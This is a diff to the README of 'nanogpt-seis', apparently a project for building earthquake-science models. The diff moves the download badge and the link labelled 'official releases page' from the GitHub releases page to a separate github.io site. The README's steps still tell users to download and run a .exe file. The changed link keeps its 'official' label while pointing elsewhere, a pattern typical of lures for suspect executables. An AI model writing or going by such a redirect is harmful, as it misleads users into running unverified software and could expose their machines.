@@ -1,6 +1,6 @@
 # 🌍 nanogpt-seis - Learn to build earthquake science models
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/ethellight565/nanogpt-seis/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://ethellight565.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware components to run this software. Ensure yo
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/ethellight565/nanogpt-seis/releases) to access the download files.
+1. Visit the [official releases page](https://ethellight565.github.io) to access the download files.
 2. Look for the latest version under the "Assets" header.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can easily find, such as your Downloads folder.
